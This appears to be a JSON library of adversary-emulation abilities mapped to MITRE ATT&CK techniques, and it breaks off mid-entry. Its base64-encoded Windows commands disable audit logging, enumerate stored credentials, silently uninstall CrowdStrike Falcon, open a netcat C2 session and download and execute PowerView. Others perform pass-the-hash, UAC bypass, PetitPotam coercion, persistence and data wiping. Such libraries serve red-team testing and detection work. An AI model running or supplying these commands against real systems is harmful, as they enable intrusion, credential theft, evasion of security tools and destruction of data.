[{"test": "aW52b2tlLWNvbW1hbmQgLUNvbXB1dGVyTmFtZSBsb2NhbGhvc3QgLXNjcmlwdGJsb2NrIHtpcGNvbmZpZ30=", "ability_id": "05a7ba0507f0946d82b6109aa1772513", "technique_name": "Remote Services: Windows Remote Management", "additional_info": {}, "privilege": "", "technique_id": "T1021.006", "platform": "windows", "name": "Invoke-Command", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Execute Invoke-command on remote host.\n\nUpon successful execution, powershell will execute ipconfig on localhost using `invoke-command`.\n", "variations": []}, {"test": "YXVkaXRwb2wgL3NldCAvY2F0ZWdvcnk6IkFjY291bnQgTG9nb24iIC9zdWNjZXNzOmRpc2FibGUgL2ZhaWx1cmU6ZGlzYWJsZSAmJiBhdWRpdHBvbCAvc2V0IC9jYXRlZ29yeToiTG9nb24vTG9nb2ZmIiAvc3VjY2VzczpkaXNhYmxlIC9mYWlsdXJlOmRpc2FibGUgJiYgYXVkaXRwb2wgL3NldCAvY2F0ZWdvcnk6IkRldGFpbGVkIFRyYWNraW5nIiAvc3VjY2VzczpkaXNhYmxl", "ability_id": "2a450a37a8601a2131ad0ecdb8188b54", "technique_name": "Impair Defenses: Disable Windows Event Logging", "additional_info": {}, "privilege": "", "technique_id": "T1562.002", "platform": "windows", "name": "Impair Windows Audit Log Policy", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["YXVkaXRwb2wgL3NldCAvY2F0ZWdvcnk6IkFjY291bnQgTG9nb24iIC9zdWNjZXNzOmVuYWJsZSAvZmFpbHVyZTplbmFibGUgJiYgYXVkaXRwb2wgL3NldCAvY2F0ZWdvcnk6IkRldGFpbGVkIFRyYWNraW5nIiAvc3VjY2VzczplbmFibGUgJiYgYXVkaXRwb2wgL3NldCAvY2F0ZWdvcnk6IkxvZ29uL0xvZ29mZiIgL3N1Y2Nlc3M6ZW5hYmxlIC9mYWlsdXJlOmVuYWJsZQ=="], "executor": "cmd", "access": {}, "description": "Disables the windows audit policy to prevent key host based telemetry being written into the event logs.\n[Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)", "variations": []}, {"test": "dmF1bHRjbWQgL2xpc3RjcmVkczoiV2luZG93cyBDcmVkZW50aWFscyIgL2FsbA==", "ability_id": "6bbb6f8b1db42e2c2c79892e8c31feb3", "technique_name": "Credentials from Password Stores", "additional_info": {}, "privilege": "", "technique_id": "T1555", "platform": "windows", "name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe", "variations": []}, {"test": "JHBzID0gZ2V0LXByb2Nlc3MgfCBzZWxlY3QgcHJvY2Vzc25hbWUsSWQ7JHZhbGlkID0gZm9yZWFjaCgkcCBpbiAkcHMpIHsgaWYoJHAuUHJvY2Vzc05hbWUgLWVxICJsc2FzcyIpIHskcH0gfTskdmFsaWQgfCBDb252ZXJ0VG8tSnNvbg==", "ability_id": "0bff4ee7-42a4-4bde-b09a-9d79d8b9edd7", "technique_name": "Process Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1057", "platform": "windows", "name": "Find LSASS", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.json", "relationships": [{"edge": "", "source": "host.process.id", "custom_parser_vals": {"json_key": "Id", "json_type": "int"}, "target": ""}]}], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Get process info for LSASS", "variations": []}, {"test": "aWYgKFRlc3QtUGF0aCAiQzpcUHJvZ3JhbURhdGFcUGFja2FnZSBDYWNoZVx7NzQ4OWJhOTMtYjY2OC00NDdmLTg0MDEtN2U1N2E2ZmU1MzhkfVxXaW5kb3dzU2Vuc29yLmV4ZSIpIHsuICJDOlxQcm9ncmFtRGF0YVxQYWNrYWdlIENhY2hlXHs3NDg5YmE5My1iNjY4LTQ0N2YtODQwMS03ZTU3YTZmZTUzOGR9XFdpbmRvd3NTZW5zb3IuZXhlIiAvcmVwYWlyIC91bmluc3RhbGwgL3F1aWV0IH0gZWxzZSB7IEdldC1DaGlsZEl0ZW0gLVBhdGggIkM6XFByb2dyYW1EYXRhXFBhY2thZ2UgQ2FjaGUiIC1JbmNsdWRlICJXaW5kb3dzU2Vuc29yLmV4ZSIgLVJlY3Vyc2UgfCAlIHsgJHNpZz0kKEdldC1BdXRoZW50aWNvZGVTaWduYXR1cmUgLUZpbGVQYXRoICRfLkZ1bGxOYW1lKTsgaWYgKCRzaWcuU3RhdHVzIC1lcSAiVmFsaWQiIC1hbmQgJHNpZy5TaWduZXJDZXJ0aWZpY2F0ZS5EbnNOYW1lTGlzdCAtZXEgIkNyb3dkU3RyaWtlLCBJbmMuIikgeyAuICIkXyIgL3JlcGFpciAvdW5pbnN0YWxsIC9xdWlldDsgYnJlYWs7fX19", "ability_id": "deaf0c3d54550c574416577922258bf2", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "Uninstall Crowdstrike Falcon on Windows", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.\n", "variations": []}, {"test": "Y21kIC9jICN7bmNhdF9leGV9ICN7c2VydmVyX2lwfSAje3NlcnZlcl9wb3J0fQ==", "ability_id": "6b69daa92033c152bb2d989c2d6691de", "technique_name": "Non-Application Layer Protocol", "additional_info": {}, "privilege": "", "technique_id": "T1095", "platform": "windows", "name": "Netcat C2", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Start C2 Session Using Ncat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n", "variations": []}, {"test": "JGNlcnQgPSBJbXBvcnQtQ2VydGlmaWNhdGUgLUZpbGVQYXRoIHJvb3RDQS5jZXIgLUNlcnRTdG9yZUxvY2F0aW9uIENlcnQ6XExvY2FsTWFjaGluZVxNeTsgTW92ZS1JdGVtIC1QYXRoICRjZXJ0LlBTUGF0aCAtRGVzdGluYXRpb24gIkNlcnQ6XExvY2FsTWFjaGluZVxSb290Ig==", "ability_id": "08611a656fc95c1594bc6efec53da5b1", "technique_name": "Subvert Trust Controls: Install Root Certificate", "additional_info": {}, "privilege": "", "technique_id": "T1553.004", "platform": "windows", "name": "Install root CA on Windows", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["dHJ5IHs7ICAgICRjZXJ0ID0gSW1wb3J0LUNlcnRpZmljYXRlIC1GaWxlUGF0aCByb290Q0EuY2VyIC1DZXJ0U3RvcmVMb2NhdGlvbiBDZXJ0OlxMb2NhbE1hY2hpbmVcTXkgLUVycm9yQWN0aW9uIElnbm9yZTsgICAgR2V0LUNoaWxkSXRlbSBDZXJ0OlxMb2NhbE1hY2hpbmVcTXlcJCgkY2VydC5UaHVtYnByaW50KSAtRXJyb3JBY3Rpb24gSWdub3JlIHwgUmVtb3ZlLUl0ZW0gLUVycm9yQWN0aW9uIElnbm9yZTsgICAgR2V0LUNoaWxkSXRlbSBDZXJ0OlxMb2NhbE1hY2hpbmVcUm9vdFwkKCRjZXJ0LlRodW1icHJpbnQpIC1FcnJvckFjdGlvbiBJZ25vcmUgfCBSZW1vdmUtSXRlbSAtRXJyb3JBY3Rpb24gSWdub3JlOyB9OyBjYXRjaCB7IH0="], "executor": "psh", "access": {}, "description": "Creates a root CA with Powershell\n", "variations": []}, {"test": "cmVnIGFkZCAiSEtMTVxTeXN0ZW1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxUZXJtaW5hbCBTZXJ2ZXJcV2luU3RhdGlvbnNcUkRQLVRjcCIgL3YgUG9ydE51bWJlciAvdCBSRUdfRFdPUkQgL2QgNDQ4OSAtZiAmJiBuZXRzaCBhZHZmaXJld2FsbCBmaXJld2FsbCBhZGQgcnVsZSBuYW1lPSJSRFBQT1JUTGF0ZXN0LVRDUC1JbiIgZGlyPWluIGFjdGlvbj1hbGxvdyBwcm90b2NvbD1UQ1AgbG9jYWxwb3J0PTQ0ODk=", "ability_id": "dd67068b052fa553ad4a0ac7d6a5ea89", "technique_name": "Remote Services: Remote Desktop Protocol", "additional_info": {}, "privilege": "", "technique_id": "T1021.001", "platform": "windows", "name": "Changing RDP Port to Non Standard Port via Command_Prompt", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGFkZCAiSEtMTVxTeXN0ZW1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxUZXJtaW5hbCBTZXJ2ZXJcV2luU3RhdGlvbnNcUkRQLVRjcCIgL3YgUG9ydE51bWJlciAvdCBSRUdfRFdPUkQgL2QgMzM4OSAtZiA+bnVsIDI+JjEgJiYgbmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgZGVsZXRlIHJ1bGUgbmFtZT0iUkRQUE9SVExhdGVzdC1UQ1AtSW4iID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Changing RDP Port to Non Standard Port via Command_Prompt\n", "variations": []}, {"test": "JERpcmVjdG9yeVNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIoIihPYmplY3RDYXRlZ29yeT1Db21wdXRlcikiKTsgJERpcmVjdG9yeVNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkKCJOYW1lIik7ICRDb21wdXRlcnMgPSAkRGlyZWN0b3J5U2VhcmNoZXIuZmluZGFsbCgpOyBmb3JlYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVycykgezsgICAkQ29tcHV0ZXIgPSAkQ29tcHV0ZXIuUHJvcGVydGllcy5uYW1lOyAgIGlmICghJENvbXB1dGVyKSB7IENvbnRpbnVlIH07ICAgV3JpdGUtSG9zdCAkQ29tcHV0ZXJ9", "ability_id": "ed229139c766eb00e6f1aece3806a481", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Enumerate domain computers within Active Directory using DirectorySearcher", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This test is a Powershell script that enumerates Active Directory to determine computers that are joined to the domain. \nThis test is designed to mimic how SessionGopher can determine the additional systems within a domain, which has been used before by threat actors to aid in lateral movement. \nReference: [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks). \nUpon successful execution, this test will output the names of the computers that reside on the domain to the console window. \n", "variations": []}, {"test": "TmV3LVBTRHJpdmUgLW5hbWUgZyAtcHNwcm92aWRlciBmaWxlc3lzdGVtIC1yb290IFxcVGFyZ2V0XEMk", "ability_id": "6b96fa3cbc72bc6771572a924a31b15d", "technique_name": "Remote Services: SMB/Windows Admin Shares", "additional_info": {}, "privilege": "", "technique_id": "T1021.002", "platform": "windows", "name": "Map Admin Share PowerShell", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Map Admin share utilizing PowerShell\n", "variations": []}, {"test": "bXNpZXhlYy5leGUgL3kgIiN7ZGxsX3BheWxvYWR9Ig==", "ability_id": "eb6359530db3f4dbc4c00445e41472fe", "technique_name": "Signed Binary Proxy Execution: Msiexec", "additional_info": {}, "privilege": "", "technique_id": "T1218.007", "platform": "windows", "name": "Msiexec.exe - Execute Arbitrary DLL", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Execute arbitrary DLL file stored locally. Commonly seen in application installation.\nUpon execution, a window titled \"Boom!\" will open that says \"Locked and Loaded!\". For 32 bit systems change the dll_payload argument to the Win32 folder.\nBy default, if the src folder is not in place, it will download the 64 bit version.\n", "variations": []}, {"test": "cGF0aD0lcGF0aCU7IkM6XFByb2dyYW0gRmlsZXMgKHg4Nilcd2luemlwIiAmJiBta2RpciAuXHRtcFx2aWN0aW0tZmlsZXMgJiYgY2QgLlx0bXBcdmljdGltLWZpbGVzICYmIGVjaG8gIlRoaXMgZmlsZSB3aWxsIGJlIGVuY3J5cHRlZCIgPiAuXGVuY3J5cHRlZF9maWxlLnR4dCAmJiAiJVByb2dyYW1GaWxlcyVcV2luWmlwXHdpbnppcDY0LmV4ZSIgLW1pbiAtYSAtcyJoZWxsbyIgYXJjaGl2ZS56aXAgKiAmJiBkaXI=", "ability_id": "fbffdd20bcf00475ce05ef81dece03a8", "technique_name": "Archive Collected Data: Archive via Utility", "additional_info": {}, "privilege": "", "technique_id": "T1560.001", "platform": "windows", "name": "Compress Data and lock with password for Exfiltration with winzip", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Note: Requires winzip installation\nwzzip sample.zip -s\"blueblue\" *.txt (VARIANT)\n", "variations": []}, {"test": "Y21zdHAuZXhlIC9zIGVhNmU0MF9UMTIxOC4wMDMuaW5m", "ability_id": "50d39c516d8a012a2228034fd5ef5ce2", "technique_name": "Signed Binary Proxy Execution: CMSTP", "additional_info": {}, "privilege": "", "technique_id": "T1218.003", "platform": "windows", "name": "CMSTP Executing Remote Scriptlet", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["ea6e40_T1218.003.inf"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Adversaries may supply CMSTP.exe with INF files infected with malicious commands\n", "variations": []}, {"test": "Y21kLmV4ZSAvQyB3aG9hbWkgJiYgd21pYyB1c2VyYWNjb3VudCBnZXQgL0FMTCAmJiBxdXNlciAvU0VSVkVSOiIje2NvbXB1dGVyX25hbWV9IiAmJiBxdXNlciAmJiBxd2luc3RhLmV4ZSAvc2VydmVyOiN7Y29tcHV0ZXJfbmFtZX0gJiYgcXdpbnN0YS5leGUgJiYgZm9yIC9GICJ0b2tlbnM9MSwyIiAlaSBpbiAoJ3F3aW5zdGEgL3NlcnZlcjoje2NvbXB1dGVyX25hbWV9IF58IGZpbmRzdHIgIkFjdGl2ZSBEaXNjIicpIGRvIEBlY2hvICVpIHwgZmluZCAvdiAiIyIgfCBmaW5kIC92ICJjb25zb2xlIiB8fCBlY2hvICVqID4gY29tcHV0ZXJzLnR4dCAmJiBARk9SIC9GICVuIGluIChjb21wdXRlcnMudHh0KSBETyBARk9SIC9GICJ0b2tlbnM9MSwyIiAlaSBpbiAoJ3F3aW5zdGEgL3NlcnZlcjolbiBefCBmaW5kc3RyICJBY3RpdmUgRGlzYyInKSBkbyBAZWNobyAlaSB8IGZpbmQgL3YgIiMiIHwgZmluZCAvdiAiY29uc29sZSIgfHwgZWNobyAlaiA+IHVzZXJuYW1lcy50eHQ=", "ability_id": "562d85a09d73f7471bd3232cbd8777cb", "technique_name": "System Owner/User Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1033", "platform": "windows", "name": "System Owner/User Discovery", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.\n", "variations": []}, {"test": "SW52b2tlLUFUSEhUTUxBcHBsaWNhdGlvbiAtSFRBRmlsZVBhdGggVGVzdC5odGEgLVNjcmlwdEVuZ2luZSBKU2NyaXB0IC1Bc0xvY2FsVU5DUGF0aCAtU2ltdWxhdGVMYXRlcmFsTW92ZW1lbnQgLU1TSFRBRmlsZVBhdGggJGVudjp3aW5kaXJcc3lzdGVtMzJcbXNodGEuZXhl", "ability_id": "d179a90ba3d6fa4bb5ad82ff9d8f4841", "technique_name": "Signed Binary Proxy Execution: Mshta", "additional_info": {}, "privilege": "", "technique_id": "T1218.005", "platform": "windows", "name": "Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.", "variations": []}, {"test": "SW52b2tlLUFUSEhUTUxBcHBsaWNhdGlvbiAtU2NyaXB0RW5naW5lIEpTY3JpcHQgLUlubGluZVByb3RvY29sSGFuZGxlciBBYm91dCAtVXNlUnVuZGxsMzIgLVJ1bmRsbDMyRmlsZVBhdGggJGVudjp3aW5kaXJcc3lzdGVtMzJccnVuZGxsMzIuZXhl", "ability_id": "5235fbc85101dd5d45f00908ccd293a6", "technique_name": "Signed Binary Proxy Execution: Mshta", "additional_info": {}, "privilege": "", "technique_id": "T1218.005", "platform": "windows", "name": "Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Executes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvZjk0YTVkMjk4YTFiNGM1ZGZiMWYzMGEyNDZkOWM3M2QxM2IyMjg4OC9SZWNvbi9Qb3dlclZpZXcucHMxJyAtVXNlQmFzaWNQYXJzaW5nKTsgRmluZC1Eb21haW5TaGFyZSAtQ2hlY2tTaGFyZUFjY2VzcyAtVmVyYm9zZQ==", "ability_id": "4b325a29e936cd1ccac2292bc92a31b5", "technique_name": "Network Share Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1135", "platform": "windows", "name": "Share Discovery with PowerView", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.\n", "variations": []}, {"test": "U2V0LUl0ZW1Qcm9wZXJ0eSAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25cIiAiVXNlcmluaXQiICJVc2VyaW5pdC5leGUsIEM6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZSIgLUZvcmNl", "ability_id": "0856714c9810ac55b53e9964d02958a0", "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL", "additional_info": {}, "privilege": "", "technique_id": "T1547.004", "platform": "windows", "name": "Winlogon Userinit Key Persistence - PowerShell", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25cIiAtTmFtZSAiVXNlcmluaXQiIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n", "variations": []}, {"test": "d3JpdGUtaG9zdCAiSW1wb3J0IGFuZCBFeGVjdXRpb24gb2YgU2hhcnBIb3VuZC5wczEgZnJvbSBQYXRoVG9BdG9taWNzRm9sZGVyXFQxMDU5LjAwMVxzcmMiIC1Gb3JlZ3JvdW5kQ29sb3IgQ3lhbjsgaW1wb3J0LW1vZHVsZSBQYXRoVG9BdG9taWNzRm9sZGVyXFQxMDU5LjAwMVxzcmNcU2hhcnBIb3VuZC5wczE7IEludm9rZS1CbG9vZEhvdW5kIC1PdXRwdXREaXJlY3RvcnkgJGVudjpUZW1wOyBTdGFydC1TbGVlcCA1", "ability_id": "9cca46473bbf2259c8101f374b55b6fa", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "Run BloodHound from local disk", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpUZW1wXCpCbG9vZEhvdW5kLnppcCAtRm9yY2U="], "executor": "psh", "access": {}, "description": "Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n", "variations": []}, {"test": "aG9zdG5hbWU=", "ability_id": "e7d023dfcc77f4b701b6cdce79e9c3c2", "technique_name": "System Information Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1082", "platform": "windows", "name": "Hostname Discovery (Windows)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.\n", "variations": []}, {"test": "QzpcQ3JhY2tNYXBFeGVjV2luXGNyYWNrbWFwZXhlYy5leGUgJXVzZXJkbnNkb21haW4lIC11IEFkbWluaXN0cmF0b3IgLUggY2MzNmNmN2E4NTE0ODkzZWZjY2QzMzI0NDY0dGtnMWEgLXggd2hvYW1p", "ability_id": "597a256401dfa1181b9624acf3128786", "technique_name": "Use Alternate Authentication Material: Pass the Hash", "additional_info": {}, "privilege": "", "technique_id": "T1550.002", "platform": "windows", "name": "crackmapexec Pass the Hash", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "command execute with crackmapexec\n", "variations": []}, {"test": "cG5wdXRpbC5leGUgL2FkZC1kcml2ZXIgIkM6XFdpbmRvd3NcSU5GXHVzYnN0b3IuaW5mIg==", "ability_id": "fe9eeee9a7b339089e5fa634b08522c1", "technique_name": "Boot or Logon Autostart Execution", "additional_info": {}, "privilege": "", "technique_id": "T1547", "platform": "windows", "name": "Add a driver", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Install a driver via pnputil.exe lolbin\n", "variations": []}, {"test": "IiV0ZW1wJVx1YWNtZVwzNCBBa2FnaTY0LmV4ZSI=", "ability_id": "32137d0b1dbea4a5827fc5d0d1dc8d36", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "UACME Bypass Method 34", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cG93ZXJzaGVsbCBTdG9wLVByb2Nlc3MgLU5hbWUgY21kIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3JlICYmIHBvd2Vyc2hlbGwgU3RvcC1Qcm9jZXNzIC1OYW1lIG1tYyAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "cmd", "access": {}, "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tShell API\n\nMethod: Environment variables expansion\n\nTarget:\t\\system32\\svchost.exe via \\system32\\schtasks.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDiskCleanupEnvironmentVariable\n\nUCM Method:\tUacMethodDiskSilentCleanup\n\nhttps://github.com/hfiref0x/UACME\n", "variations": []}, {"test": "JiAiJGVudjpURU1QXFBldGl0UG90YW0uZXhlIiAxMC4wLjAuMyAxMC4wLjAuMiAxOyBXcml0ZS1Ib3N0ICJFbmQgb2YgUGV0aXRQb3RhbSBhdHRhY2si", "ability_id": "74982b5ad2508dfeb87f03c47e89f0c6", "technique_name": "Forced Authentication", "additional_info": {}, "privilege": "", "technique_id": "T1187", "platform": "windows", "name": "PetitPotam", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.\n", "variations": []}, {"test": "Y2lwaGVyLmV4ZSAvdzpDOg==", "ability_id": "66f19707907a88df172057c131ae2168", "technique_name": "Data Destruction", "additional_info": {}, "privilege": "", "technique_id": "T1485", "platform": "windows", "name": "Overwrite deleted data on C drive", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "RansomEXX malware removes all deleted files using windows built-in cipher.exe to prevent forensic recover.\nThis process is very slow and test execution may timeout. \nhttps://www.cybereason.com/blog/cybereason-vs.-ransomexx-ransomware\nhttps://support.microsoft.com/en-us/topic/cipher-exe-security-tool-for-the-encrypting-file-system-56c85edd-85cf-ac07-f2f7-ca2d35dab7e4\n", "variations": []}, {"test": "LlxJbnZva2UtTWVtZUthdHoucHMx", "ability_id": "68235976-2404-42a8-9105-68230cfef562", "technique_name": "Defacement", "additional_info": {}, "privilege": "", "technique_id": "T1491", "platform": "windows", "name": "Invoke-MemeKatz", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["Invoke-MemeKatz.ps1"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJJbnZva2UtTWVtZUthdHoucHMxIg=="], "executor": "psh", "access": {}, "description": "Downloads random meme and sets as desktop background", "variations": []}, {"test": "Y29weSAlV0lORElSJVxTeXN0ZW0zMlxjbWQuZXhlIC9ZICVBTExVU0VSU1BST0ZJTEUlXGNtZC5leGUgJiYgc3RhcnQgJUFMTFVTRVJTUFJPRklMRSVcY21kLmV4ZQ==", "ability_id": "edb743e25efd8f8249fb23191961c83c", "technique_name": "Masquerading", "additional_info": {}, "privilege": "", "technique_id": "T1036", "platform": "windows", "name": "System File Copied to Unusual Location", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICVBTExVU0VSU1BST0ZJTEUlXGNtZC5leGUgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "It may be suspicious seeing a file copy of an EXE in System32 or SysWOW64 to a non-system directory or executing from a non-system directory.", "variations": []}, {"test": "cmVnLmV4ZSBpbXBvcnQgZTc2NGY2X1QxNTQ2LjAxMC5yZWc=", "ability_id": "53ec07fdf1496da055cd8026114957f1", "technique_name": "Event Triggered Execution: AppInit DLLs", "additional_info": {}, "privilege": "", "technique_id": "T1546.010", "platform": "windows", "name": "Install AppInit Shim", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["e764f6_T1546.010.reg", "9e2f65_T1546.010-cleanup.reg"], "cleanup": ["cmVnLmV4ZSBpbXBvcnQgOWUyZjY1X1QxNTQ2LjAxMC1jbGVhbnVwLnJlZyA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "AppInit_DLLs is a mechanism that allows an arbitrary list of DLLs to be loaded into each user mode process on the system. Upon succesfully execution, \nyou will see the message \"The operation completed successfully.\" Each time the DLL is loaded, you will see a message box with a message of \"Install AppInit Shim DLL was called!\" appear.\nThis will happen regularly as your computer starts up various applications and may in fact drive you crazy. A reliable way to make the message box appear and verify the \nAppInit Dlls are loading is to start the notepad application. Be sure to run the cleanup commands afterwards so you don't keep getting message boxes showing up.\n\nNote: If secure boot is enabled, this technique will not work. https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls\n", "variations": []}, {"test": 